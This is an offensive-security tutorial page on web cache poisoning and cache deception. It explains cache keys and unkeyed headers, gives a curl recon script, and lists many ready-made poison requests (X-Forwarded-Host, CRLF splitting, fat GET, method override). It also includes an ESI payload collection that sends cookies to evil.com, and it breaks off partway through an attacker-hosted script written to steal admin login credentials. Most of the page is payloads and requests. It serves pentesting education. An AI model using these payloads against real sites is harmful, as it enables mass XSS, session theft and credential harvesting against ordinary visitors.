---
title: Web Cache Poisoning
description: Web Cache Poisoning attacks — payloads, exploitation chains, cache key manipulation, privilege escalation, pentesting methodology, and advanced techniques.
navigation:
  icon: i-lucide-archive
  title: Web Cache Poisoning
---

## What is Web Cache Poisoning?

**Web Cache Poisoning** is an attack where an adversary exploits caching mechanisms to serve **malicious content** to other users. The attacker manipulates **unkeyed inputs** — HTTP headers, cookies, or query parameters that the cache ignores when generating the cache key but the backend server **processes and reflects** into the response.

::callout
---
icon: i-lucide-skull
color: red
---
Web Cache Poisoning is **critical** because a single poisoned request can affect **thousands or millions of users** who receive the cached malicious response. The attacker doesn't need to interact with each victim — the **cache does the distribution**.
::

::card-group
  ::card
  ---
  title: Unkeyed Headers
  icon: i-lucide-eye-off
  ---
  HTTP headers that the cache ignores when building the cache key but the origin server processes and reflects into the response body.
  ::

  ::card
  ---
  title: Cache Key Manipulation
  icon: i-lucide-key-round
  ---
  Techniques to control which cache entry is poisoned by manipulating how the cache normalizes and constructs its lookup keys.
  ::

  ::card
  ---
  title: Cache Deception
  icon: i-lucide-mask
  ---
  A related attack where the attacker tricks the cache into storing a **victim's sensitive response** and then accesses it — the inverse of cache poisoning.
  ::

  ::card
  ---
  title: Response Splitting
  icon: i-lucide-split
  ---
  Injecting CRLF characters into headers to manipulate cache behavior and create separate cached responses with attacker-controlled content.
  ::
::

---

## How Web Cache Poisoning Works

::steps{level="4"}

#### Step 1 — Identify Unkeyed Inputs

The attacker discovers HTTP request components (headers, cookies, query parameters) that:
- Are **NOT part of the cache key** (the cache ignores them)
- **ARE reflected** in the response or influence the response content

#### Step 2 — Craft the Poisoned Request

A malicious value is placed in the unkeyed input. This value gets reflected into the response — typically injecting JavaScript, redirecting to malicious domains, or manipulating resource URLs.

#### Step 3 — Poison the Cache

The attacker sends the crafted request. The cache stores the **malicious response** under the cache key of the legitimate page.

#### Step 4 — Victims Receive Poisoned Content

When any user requests the same page, the cache serves the **poisoned response** — executing the attacker's payload without any further interaction from the attacker.

::

::note
The fundamental requirement is a **mismatch** between what the cache considers as the "key" and what the origin server actually processes. This mismatch is the attack surface.
::

---

## Cache Architecture & Key Concepts

### How Caching Works

```text [cache-architecture.txt]
┌──────────┐     ┌───────────────┐     ┌──────────────┐
│  Client   │────▶│  Cache Layer  │────▶│ Origin Server│
│ (Browser) │     │ (CDN/Reverse  │     │ (Application)│
│           │◀────│  Proxy/Nginx) │◀────│              │
└──────────┘     └───────────────┘     └──────────────┘

Request Flow:
1. Client sends request to cache
2. Cache checks if response exists for this CACHE KEY
3. Cache HIT  → Return stored response (no origin contact)
4. Cache MISS → Forward to origin → Store response → Return to client
```

### Cache Keys Explained

::tabs
  :::tabs-item{icon="i-lucide-info" label="What is a Cache Key?"}
  ```text [cache-key-explained.txt]
  A Cache Key is a SUBSET of the HTTP request used to identify
  cached responses. Typically includes:
  
  ┌─────────────────────────────────────────────────┐
  │ CACHE KEY (what the cache uses to look up)      │
  ├─────────────────────────────────────────────────┤
  │ ✓ HTTP Method (GET)                             │
  │ ✓ Host header (www.target.com)                  │
  │ ✓ URL Path (/page/about)                        │
  │ ✓ Query string (?lang=en)                       │
  └─────────────────────────────────────────────────┘
  
  ┌─────────────────────────────────────────────────┐
  │ UNKEYED (cache IGNORES, but server PROCESSES)   │
  ├─────────────────────────────────────────────────┤
  │ ✗ X-Forwarded-Host header                       │
  │ ✗ X-Forwarded-Scheme header                     │
  │ ✗ X-Original-URL header                         │
  │ ✗ User-Agent header                             │
  │ ✗ Cookie header (sometimes)                     │
  │ ✗ Accept-Language header                        │
  │ ✗ X-Forwarded-For header                        │
  │ ✗ Custom headers (X-Rewrite-URL, etc.)          │
  └─────────────────────────────────────────────────┘
  
  ATTACK = Put malicious payload in UNKEYED inputs
           that get REFLECTED into the response
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="Cache Key Formats"}
  ```text [cache-key-formats.txt]
  Different cache providers use different key formats:
  
  ── Varnish ──
  Key: req.http.host + req.url
  Example: "www.target.com/page?id=1"
  
  ── Cloudflare ──
  Key: scheme + host + path + sorted_query
  Example: "https://www.target.com/page?id=1"
  
  ── Akamai ──  
  Key: host + path + query (configurable)
  Supports: cache-key-rewrite, cache ID modifications
  
  ── Nginx (proxy_cache_key) ──
  Default: "$scheme$proxy_host$request_uri"
  Example: "httpswww.target.com/page?id=1"
  
  ── AWS CloudFront ──
  Key: host + path + configured query strings
  Headers can be added to key via cache policy
  
  ── Fastly/Varnish ──
  Key: Fully customizable via VCL
  hash_data(req.http.host + req.url)
  ```
  :::
::

### Cache Headers Cheat Sheet

| Header | Purpose | Example |
|--------|---------|---------|
| `X-Cache` | Indicates cache HIT or MISS | `X-Cache: HIT` |
| `CF-Cache-Status` | Cloudflare cache status | `CF-Cache-Status: DYNAMIC` |
| `Age` | Seconds since cached | `Age: 3600` |
| `Cache-Control` | Caching directives | `Cache-Control: max-age=86400` |
| `Vary` | Headers that affect cache key | `Vary: Accept-Encoding, Cookie` |
| `X-Cache-Hits` | Number of times served from cache | `X-Cache-Hits: 47` |
| `CDN-Cache-Control` | CDN-specific caching rules | `CDN-Cache-Control: max-age=600` |
| `Surrogate-Control` | Surrogate (CDN) cache directives | `Surrogate-Control: max-age=3600` |
| `X-Varnish` | Varnish request ID | `X-Varnish: 117 113` |
| `Via` | Proxy/cache intermediaries | `Via: 1.1 varnish (Varnish/6.0)` |
| `X-Served-By` | Which cache node served | `X-Served-By: cache-lhr7324` |

---

## Discovery & Reconnaissance

### Finding Unkeyed Inputs

::tabs
  :::tabs-item{icon="i-lucide-search" label="Manual Discovery"}
  ```http [unkeyed-header-test.http]
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-Host: attacker.com
  X-Forwarded-Scheme: http
  X-Original-URL: /admin
  X-Rewrite-URL: /admin
  X-Forwarded-For: 127.0.0.1
  X-Host: attacker.com
  X-Forwarded-Server: attacker.com
  Forwarded: host=attacker.com
  X-HTTP-Method-Override: POST
  X-Custom-IP-Authorization: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Real-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1
  CF-Connecting-IP: 127.0.0.1
  Fastly-Client-IP: 127.0.0.1
  X-Azure-ClientIP: 127.0.0.1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Param Miner (Burp)"}
  ```text [param-miner-usage.txt]
  Param Miner — Burp Suite Extension (by James Kettle)
  ════════════════════════════════════════════════════════
  
  Installation:
  BApp Store → Search "Param Miner" → Install
  
  Usage:
  1. Right-click any request in Burp
  2. Extensions → Param Miner → "Guess headers"
  3. Also try: "Guess cookies" and "Guess params"
  
  Configuration:
  - Add cachebuster: ✓ (prevents false positives)
  - Per-request cachebuster: URL param with random value
  - Custom wordlist: add known unkeyed headers
  
  What it does:
  - Sends requests with each header from its wordlist
  - Adds a unique cachebuster to each request
  - Compares responses to detect reflected/processed headers
  - Reports unkeyed inputs that affect the response
  
  Key headers it tests:
  X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL,
  X-Rewrite-URL, X-Forwarded-Port, X-Forwarded-Proto,
  X-HTTP-Method-Override, and 1000+ more
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Web-Cache-Vulnerability-Scanner"}
  ```bash [wcvs-usage.sh]
  # Web Cache Vulnerability Scanner
  # Automated detection of cache poisoning vectors
  
  # Install
  go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
  
  # Basic scan
  Web-Cache-Vulnerability-Scanner -u https://target.com
  
  # With custom wordlist
  Web-Cache-Vulnerability-Scanner -u https://target.com \
    -w custom-headers.txt
  
  # Scan multiple URLs
  Web-Cache-Vulnerability-Scanner -l urls.txt \
    -o results.json \
    -t 10
  
  # Aggressive mode with all tests
  Web-Cache-Vulnerability-Scanner -u https://target.com \
    --all-tests \
    --verbose
  ```
  :::
::

### Identifying Cache Behavior

::code-collapse

```bash [cache-behavior-recon.sh]
#!/bin/bash
# Cache Behavior Reconnaissance Script
# Tests various aspects of cache behavior

TARGET="https://target.com"
PAGE="/page"

echo "═══════════════════════════════════════════"
echo " Web Cache Behavior Analysis"
echo " Target: $TARGET$PAGE"
echo "═══════════════════════════════════════════"

echo -e "\n[1] Basic Cache Detection"
echo "─────────────────────────"
for i in 1 2 3; do
  echo "Request $i:"
  curl -s -o /dev/null -D - "$TARGET$PAGE" 2>/dev/null | \
    grep -iE "(x-cache|cf-cache|age:|via:|x-varnish|x-served|cache-control|cdn-cache)"
  echo "---"
  sleep 1
done

echo -e "\n[2] Cache Key Analysis — Query Parameters"
echo "─────────────────────────────────────────────"
BUSTER="cb=$(date +%s)"
echo "With cachebuster: $BUSTER"
curl -s -o /dev/null -D - "$TARGET$PAGE?$BUSTER" 2>/dev/null | \
  grep -iE "(x-cache|cf-cache|age:)"

echo -e "\n[3] Unkeyed Header Test — X-Forwarded-Host"
echo "────────────────────────────────────────────"
curl -s "$TARGET$PAGE?$BUSTER" \
  -H "X-Forwarded-Host: evil.com" | \
  grep -i "evil.com" && echo "[+] X-Forwarded-Host REFLECTED!" || echo "[-] Not reflected"

echo -e "\n[4] Unkeyed Header Test — X-Forwarded-Scheme"
echo "──────────────────────────────────────────────"
curl -s -D - "$TARGET$PAGE?$BUSTER" \
  -H "X-Forwarded-Scheme: http" 2>/dev/null | \
  grep -iE "(location:|301|302)" && echo "[+] Redirect detected!" || echo "[-] No redirect"

echo -e "\n[5] Unkeyed Header Test — X-Original-URL"
echo "────────────────────────────────────────────"
curl -s "$TARGET$PAGE?$BUSTER" \
  -H "X-Original-URL: /admin" | \
  grep -iE "(admin|dashboard|unauthorized)" && echo "[+] X-Original-URL processed!" || echo "[-] Not processed"

echo -e "\n[6] Vary Header Analysis"
echo "────────────────────────"
curl -s -o /dev/null -D - "$TARGET$PAGE" 2>/dev/null | \
  grep -i "Vary:" 

echo -e "\n[7] Cache-Control Analysis"
echo "──────────────────────────"
curl -s -o /dev/null -D - "$TARGET$PAGE" 2>/dev/null | \
  grep -i "Cache-Control:"

echo -e "\n═══════════════════════════════════════════"
echo " Scan Complete"
echo "═══════════════════════════════════════════"
```

::

---

## Payloads & Techniques

### Basic — X-Forwarded-Host Poisoning

The most common cache poisoning vector. Many frameworks use `X-Forwarded-Host` to generate absolute URLs for assets, canonical links, and Open Graph tags.

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Poison Request"}
  ```http [xfh-poison.http]
  GET /en/page HTTP/1.1
  Host: www.target.com
  X-Forwarded-Host: evil-attacker.com

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Poisoned Response"}
  ```html [poisoned-response.html]
  HTTP/1.1 200 OK
  Cache-Control: public, max-age=86400
  X-Cache: MISS
  Age: 0

  <!DOCTYPE html>
  <html>
  <head>
    <!-- Attacker's domain injected into meta tags -->
    <meta property="og:url" content="https://evil-attacker.com/en/page" />
    <link rel="canonical" href="https://evil-attacker.com/en/page" />
    
    <!-- JavaScript loaded from attacker's server! -->
    <script src="https://evil-attacker.com/assets/app.js"></script>
    <link rel="stylesheet" href="https://evil-attacker.com/assets/style.css" />
  </head>
  <body>
    <!-- All subsequent visitors receive this poisoned page -->
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Impact"}
  ```text [xfh-impact.txt]
  IMPACT CHAIN:
  ═════════════
  
  1. Attacker hosts malicious JS on evil-attacker.com/assets/app.js
  2. Sends poison request with X-Forwarded-Host: evil-attacker.com
  3. Cache stores response with attacker's domain in resource URLs
  4. ALL visitors to /en/page now load attacker's JavaScript
  
  Possible payloads on evil-attacker.com/assets/app.js:
  ├── document.cookie exfiltration
  ├── Keylogger injection
  ├── Credential harvesting (fake login forms)
  ├── Cryptominer injection
  ├── Drive-by download
  ├── Session hijacking
  └── Redirect to phishing page
  
  Scale: If the page gets 100,000 visits/day and cache TTL is 24h,
         ONE poison request compromises ALL 100,000 visitors.
  ```
  :::
::

### X-Forwarded-Scheme — Force HTTPS → HTTP Redirect Loop

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Poison Request"}
  ```http [xfs-poison.http]
  GET /login HTTP/1.1
  Host: www.target.com
  X-Forwarded-Scheme: http

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Poisoned Response (302 Redirect)"}
  ```http [xfs-response.http]
  HTTP/1.1 302 Found
  Location: https://www.target.com/login
  Cache-Control: public, max-age=1800
  X-Cache: MISS

  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Attack Explanation"}
  ```text [xfs-explanation.txt]
  ATTACK: Denial of Service via Redirect Loop
  ════════════════════════════════════════════
  
  1. Backend sees X-Forwarded-Scheme: http
  2. Thinks the client connected via HTTP
  3. Issues 302 redirect to HTTPS version
  4. Cache stores this 302 redirect
  5. ALL HTTPS visitors now get redirected to... HTTPS
  6. Which serves the cached 302... to HTTPS
  7. Infinite redirect loop → PAGE IS UNUSABLE
  
  Combined with X-Forwarded-Host:
  ─────────────────────────────────
  X-Forwarded-Scheme: http
  X-Forwarded-Host: evil.com
  
  Response: 302 → https://evil.com/login
  
  Now ALL visitors are redirected to attacker's phishing site!
  ```
  :::
::

### X-Original-URL / X-Rewrite-URL — Path Override

Some web servers (IIS, certain Nginx configs) support override headers that change the URL path processed by the backend while the cache keys on the original path.

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Path Override Poison"}
  ```http [path-override.http]
  GET /harmless-page HTTP/1.1
  Host: target.com
  X-Original-URL: /admin/delete-all-users

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="IIS X-Rewrite-URL"}
  ```http [iis-rewrite.http]
  GET / HTTP/1.1
  Host: target.com
  X-Rewrite-URL: /admin/panel

  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Explanation"}
  ```text [path-override-explain.txt]
  CACHE KEY:     GET target.com/harmless-page
  BACKEND SEES:  GET target.com/admin/delete-all-users
  
  Result:
  - Cache stores admin panel content under /harmless-page
  - OR: Triggers admin actions when users visit /harmless-page
  - Bypasses cache-level access controls
  
  Useful for:
  ├── Accessing admin pages cached under public URLs
  ├── Bypassing WAF rules (WAF sees /harmless-page)
  ├── Cache poisoning with sensitive content
  └── Triggering state-changing actions via cache
  ```
  :::
::

### Fat GET Requests — Body in GET

Some frameworks parse the body of GET requests. If the cache doesn't include the body in the key, this creates a poisoning vector.

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Fat GET Payload"}
  ```http [fat-get.http]
  GET /api/search?q=shoes HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded

  q=<script>alert(document.cookie)</script>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Explanation"}
  ```text [fat-get-explain.txt]
  CACHE KEY:  GET target.com/api/search?q=shoes
  BODY:       q=<script>alert(document.cookie)</script>
  
  Some frameworks (Ruby on Rails, some PHP apps):
  - Parse GET body parameters
  - Body parameter OVERRIDES query parameter
  - Server processes: q = <script>alert(document.cookie)</script>
  - Cache stores XSS payload under ?q=shoes
  
  All users searching for "shoes" get XSS!
  ```
  :::
::

### HTTP Method Override

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Method Override Poison"}
  ```http [method-override.http]
  GET /api/user/profile HTTP/1.1
  Host: target.com
  X-HTTP-Method-Override: DELETE
  X-Method-Override: PUT
  X-HTTP-Method: PATCH

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="POST as GET"}
  ```http [post-as-get.http]
  GET /api/settings HTTP/1.1
  Host: target.com
  X-HTTP-Method-Override: POST
  Content-Type: application/json

  {"theme":"<img src=x onerror=alert(1)>"}
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Impact"}
  ```text [method-override-impact.txt]
  SCENARIO:
  Cache keys on: GET /api/user/profile
  Backend processes: DELETE /api/user/profile
  
  Result: Visiting the profile page triggers account deletion
  
  SCENARIO 2:
  Cache keys on: GET /api/settings
  Backend processes: POST /api/settings with XSS payload
  
  Result: Settings page cached with XSS, all users affected
  ```
  :::
::

### Port-Based Poisoning

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Port Poison Request"}
  ```http [port-poison.http]
  GET /page HTTP/1.1
  Host: target.com:1337

  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Explanation"}
  ```text [port-poison-explain.txt]
  Some caches STRIP the port from the Host header for the cache key:
  
  CACHE KEY: target.com/page  (port stripped)
  
  But the backend INCLUDES the port in generated URLs:
  
  <link rel="canonical" href="https://target.com:1337/page">
  <script src="https://target.com:1337/assets/app.js"></script>
  
  If attacker controls a service on target.com:1337,
  they can serve malicious JavaScript.
  
  Even without control of :1337, broken resource URLs = DoS
  ```
  :::
::

### Vary Header Exploitation

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="User-Agent Poison"}
  ```http [vary-ua-poison.http]
  GET /page HTTP/1.1
  Host: target.com
  User-Agent: <script>alert(1)</script>
  X-Forwarded-Host: evil.com

  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Vary Header Analysis"}
  ```text [vary-analysis.txt]
  The Vary header tells the cache to create SEPARATE entries
  based on specific request headers.
  
  Vary: Accept-Encoding
  → Cache stores separate entries for gzip, br, identity
  
  Vary: User-Agent
  → Cache stores separate entry for EACH User-Agent string!
  → This means you can poison cache for specific UA strings
  
  Vary: Accept-Language
  → Different cached version per language
  → Poison only affects users with matching Accept-Language
  
  ATTACK:
  If Vary includes User-Agent:
  1. Send poison with User-Agent: Mozilla/5.0 (Windows NT 10.0...)
  2. Only Windows Chrome users get the poisoned version
  3. Targeted cache poisoning!
  
  If Vary does NOT include a header you're poisoning with:
  → ALL users get the poisoned response regardless
  ```
  :::
::

### Query Parameter Normalization Abuse

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Parameter Cloaking"}
  ```http [param-cloaking.http]
  GET /page?cachebuster=123&utm_content=x;callback=evil HTTP/1.1
  Host: target.com

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Duplicate Parameters"}
  ```http [duplicate-params.http]
  GET /search?q=normal&q=<script>alert(1)</script> HTTP/1.1
  Host: target.com

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Unkeyed Query Params"}
  ```http [unkeyed-params.http]
  GET /page?utm_source=attacker&utm_content=<script>alert(1)</script> HTTP/1.1
  Host: target.com

  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Explanation"}
  ```text [param-normalization.txt]
  PARAMETER CLOAKING:
  Some caches parse query strings differently than backends.
  
  Cache sees: callback=evil as part of utm_content value
  Backend sees: callback=evil as a separate parameter
  
  DUPLICATE PARAMETERS:
  Cache keys on: q=normal (first occurrence)
  Backend uses: q=<script>alert(1)</script> (last occurrence)
  
  UNKEYED QUERY PARAMS:
  Many CDNs exclude marketing params from cache key:
  utm_source, utm_medium, utm_campaign, utm_content, utm_term,
  fbclid, gclid, mc_cid, mc_eid
  
  If these are reflected in the page → XSS via cache poisoning!
  
  CDN Excluded Params (common):
  ├── Cloudflare: configurable via Cache Rules
  ├── Akamai: Remove query params in cache key settings
  ├── Fastly: Custom VCL to strip params
  └── AWS CloudFront: Cache policy defines included params
  ```
  :::
::

### CRLF Injection / Response Splitting

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="CRLF Header Injection"}
  ```http [crlf-poison.http]
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>

  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Set-Cookie Injection"}
  ```http [crlf-cookie.http]
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com%0d%0aSet-Cookie:%20admin=true%0d%0a

  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Explanation"}
  ```text [crlf-explain.txt]
  CRLF = Carriage Return (%0d) + Line Feed (%0a)
  
  If the server reflects an unkeyed header into a response header
  WITHOUT sanitizing CRLF characters:
  
  1. Attacker injects new headers into the response
  2. Can inject Set-Cookie to fixate sessions
  3. Can inject Content-Length: 0 to truncate response
  4. Can inject entirely new HTTP response (response splitting)
  5. Cache stores the split/modified response
  
  Combined with cache poisoning:
  → Session fixation at scale
  → XSS at scale  
  → Complete page replacement at scale
  ```
  :::
::

### Resource Import Poisoning

::tabs
  :::tabs-item{icon="i-lucide-code" label="Link Header Injection"}
  ```http [link-header-poison.http]
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com

  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Poisoned Response"}
  ```html [resource-poisoned.html]
  HTTP/1.1 200 OK
  Cache-Control: public, max-age=3600

  <html>
  <head>
    <!-- All resource URLs now point to attacker -->
    <script src="https://evil.com/static/js/main.chunk.js"></script>
    <script src="https://evil.com/static/js/vendors.chunk.js"></script>
    <link href="https://evil.com/static/css/main.css" rel="stylesheet">
    
    <!-- Preload/prefetch also poisoned -->
    <link rel="preload" href="https://evil.com/static/js/runtime.js" as="script">
    
    <!-- Favicon, manifest, icons -->
    <link rel="icon" href="https://evil.com/favicon.ico">
    <link rel="manifest" href="https://evil.com/manifest.json">
  </head>
  <body>
    <!-- Images and API endpoints -->
    <img src="https://evil.com/images/logo.png">
    
    <script>
      // API base URL also poisoned
      window.__API_BASE__ = "https://evil.com/api";
    </script>
  </body>
  </html>
  ```
  :::
::

---

## Advanced Techniques

### Cache Poisoning via Edge Side Includes (ESI)

::tabs
  :::tabs-item{icon="i-lucide-code" label="ESI Injection Payload"}
  ```http [esi-injection.http]
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com"><esi:include src="https://evil.com/steal-cookies"/>

  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="ESI Payloads Collection"}
  ```xml [esi-payloads.xml]
  <!-- Basic ESI Include -->
  <esi:include src="https://evil.com/xss.html"/>

  <!-- ESI with alt (fallback) -->
  <esi:include src="https://evil.com/payload" alt="https://evil.com/backup"/>

  <!-- ESI Cookie Exfiltration -->
  <esi:include src="https://evil.com/steal?cookie=$(HTTP_COOKIE)"/>

  <!-- ESI Inline Fragment -->
  <esi:inline name="/cached-fragment">
    <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  </esi:inline>

  <!-- ESI with XSLT (if supported) -->
  <esi:include src="https://evil.com/xslt-payload" dca="xslt"/>

  <!-- ESI Remove (hide content from users) -->
  <esi:remove>
    This content is removed by ESI processing
  </esi:remove>

  <!-- ESI Comment (may bypass WAF) -->
  <!--esi <script>alert(1)</script> -->

  <!-- ESI Vars -->
  <esi:vars>
    <script>alert('$(HTTP_COOKIE)');</script>
  </esi:vars>

  <!-- ESI Choose/When (conditional) -->
  <esi:choose>
    <esi:when test="$(HTTP_COOKIE{session})!=''">
      <esi:include src="https://evil.com/steal?s=$(HTTP_COOKIE{session})"/>
    </esi:when>
  </esi:choose>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="ESI-Capable Servers"}
  ```text [esi-servers.txt]
  ESI (Edge Side Includes) capable servers/CDNs:
  ═══════════════════════════════════════════════
  
  ✓ Varnish Cache     — ESI enabled by default
  ✓ Squid Proxy       — ESI support available
  ✓ Akamai            — ESI supported (EdgeSuite)
  ✓ Fastly            — ESI via VCL configuration
  ✓ Oracle Web Cache  — ESI supported
  ✓ IBM WebSphere     — ESI processor included
  ✓ F5 BIG-IP         — iRules ESI support
  
  Detection:
  1. Inject ESI tags in unkeyed headers
  2. Check if <esi:include> triggers HTTP requests
  3. Look for Surrogate-Control header in responses:
     Surrogate-Control: content="ESI/1.0"
  4. Check for X-ESI header
  ```
  :::
::

### Cache Poisoning with Multiple Headers (Chained)

::code-collapse

```http [chained-headers.http]
# Technique: Combine multiple unkeyed headers for maximum impact

# Chain 1: XSS via resource import + scheme downgrade
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 443

# Chain 2: Path override + host override
GET /public-page HTTP/1.1
Host: target.com
X-Original-URL: /admin/settings
X-Forwarded-Host: evil.com

# Chain 3: CRLF + method override + host override
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Host: x%0d%0aX-XSS-Protection:%200%0d%0a
X-HTTP-Method-Override: POST
Content-Type: application/json

{"callback":"<script>alert(document.domain)</script>"}

# Chain 4: Multiple host headers (ambiguity attack)
GET /page HTTP/1.1
Host: target.com
Host: evil.com
X-Forwarded-Host: evil2.com

# Chain 5: Cloudflare-specific bypass
GET /page HTTP/1.1
Host: target.com
CF-Connecting-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
True-Client-IP: 127.0.0.1
Origin: https://evil.com
```

::

### Web Cache Deception (Inverse Attack)

::warning
**Cache Deception** is the inverse of Cache Poisoning. Instead of poisoning the cache with malicious content, the attacker tricks the cache into storing a **victim's private response** that the attacker can then access.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cache Deception Payloads"}
  ```text [cache-deception-payloads.txt]
  BASIC PATH CONFUSION:
  ═════════════════════
  Trick the victim into visiting:
  
  https://target.com/account/settings/nonexistent.css
  https://target.com/account/settings/anything.js
  https://target.com/account/settings/logo.png
  https://target.com/my-account/profile.woff2
  https://target.com/dashboard/data.json
  
  Cache sees: .css/.js/.png extension → static file → CACHE IT
  Backend sees: /account/settings → dynamic page → returns user data
  
  Result: Victim's account page cached → attacker fetches same URL
  
  PATH PARAMETER CONFUSION:
  ═════════════════════════
  https://target.com/account/settings;/static/style.css
  https://target.com/profile%2F..%2Fstatic%2Flogo.png
  https://target.com/account/.%2e/static/cached.js
  
  DELIMITER CONFUSION:
  ════════════════════
  https://target.com/account/settings%3Fignored=/static/file.css
  https://target.com/account/settings%23fragment/style.css
  https://target.com/account/settings/..%2fstatic/file.js
  
  EXTENSION TRICKS:
  ════════════════════
  https://target.com/api/user/me/.css
  https://target.com/api/user/profile/.js
  https://target.com/api/user/me/%2e%2ecss
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Attack Flow"}
  ```text [cache-deception-flow.txt]
  ┌────────────┐                    ┌─────────┐           ┌──────────┐
  │  Attacker  │                    │  Cache   │           │  Backend │
  └─────┬──────┘                    └────┬────┘           └─────┬────┘
        │                                │                      │
        │ 1. Send victim a link:         │                      │
        │    target.com/account/x.css    │                      │
        │                                │                      │
        │         ┌──────────┐           │                      │
        │         │  Victim  │           │                      │
        │         └────┬─────┘           │                      │
        │              │                 │                      │
        │              │ GET /account/   │                      │
        │              │ x.css           │                      │
        │              │────────────────▶│ MISS → Forward       │
        │              │                 │─────────────────────▶│
        │              │                 │                      │
        │              │                 │  200 OK              │
        │              │                 │  (victim's account   │
        │              │                 │   page with PII)     │
        │              │                 │◀─────────────────────│
        │              │                 │                      │
        │              │  200 OK         │ Cache stores under   │
        │              │  (account data) │ /account/x.css       │
        │              │◀────────────────│                      │
        │              │                 │                      │
        │ 2. Fetch:    │                 │                      │
        │ /account/    │                 │                      │
        │ x.css        │                 │                      │
        │─────────────────────────────▶│                      │
        │              │                 │ HIT!                 │
        │ Victim's     │                 │ (serve cached        │
        │ account data!│                 │  victim response)    │
        │◀─────────────────────────────│                      │
        │              │                 │                      │
  ```
  :::
::

### Cache Key Normalization Exploits

::code-collapse

```text [cache-key-normalization.txt]
CACHE KEY NORMALIZATION ATTACKS
════════════════════════════════

Different cache layers normalize cache keys differently.
Exploiting these differences creates poisoning opportunities.

1. CASE NORMALIZATION
   ───────────────────
   Cache: /Page = /page = /PAGE  (case-insensitive)
   Backend: /Page ≠ /page ≠ /PAGE (case-sensitive)
   
   Attack: Poison /PAGE, victims visiting /page get poisoned content
   if the cache normalizes to lowercase

2. ENCODING NORMALIZATION
   ───────────────────────
   Cache: /page = /%70%61%67%65  (decodes URL encoding)
   Backend: /page ≠ /%70%61%67%65 (treats as different paths)
   
   Attack: Poison /%70%61%67%65, mapped to /page in cache

3. SLASH NORMALIZATION
   ────────────────────
   Cache: /page = /page/ = //page  (normalizes slashes)
   Backend: /page ≠ /page/  (different routes)
   
   Attack: Poison /page/ (may route differently on backend)

4. DOT SEGMENT NORMALIZATION
   ──────────────────────────
   Cache: /static/../admin = /admin  (resolves dot segments)
   Backend: /static/../admin → may serve /static/* rules
   
   Attack: Bypass cache rules that only cache /static/* paths

5. QUERY STRING NORMALIZATION
   ──────────────────────────
   Cache: ?a=1&b=2 = ?b=2&a=1  (sorts parameters)
   Backend: Different parameter order → different processing
   
   Cache: ?a=1&a=2 → uses first value: a=1
   Backend: ?a=1&a=2 → uses last value: a=2
   
   Attack: Duplicate parameter → different values for cache vs backend

6. FRAGMENT HANDLING
   ─────────────────
   Cache: /page#fragment → strips fragment → key is /page
   Backend: Some backends process fragments differently
   
   Attack: /page#<script>alert(1)</script> if reflected
```

::

---

## Privilege Escalation via Cache Poisoning

::caution
Cache Poisoning can escalate to **full account takeover** and **admin-level access** by poisoning authentication flows, admin panels, or JavaScript resources used for access control.
::

### PrivEsc — Admin Panel Cache Poisoning

::tabs
  :::tabs-item{icon="i-lucide-code" label="Attack Payload"}
  ```http [privesc-admin-poison.http]
  # Step 1: Poison the admin login page with credential-stealing JS
  GET /admin/login HTTP/1.1
  Host: target.com
  X-Forwarded-Host: evil.com

  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Attacker's evil.com/assets/admin.js"}
  ```javascript [evil-admin-js.js]
  // Hosted on evil.com — loaded by poisoned admin login page

  // 1. Steal admin credentials on form submit
  document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form[action*="login"]');
    if (form) {
      form.addEventListener('submit', function(e) {
        const formData = new FormData(form);
        const creds = {};
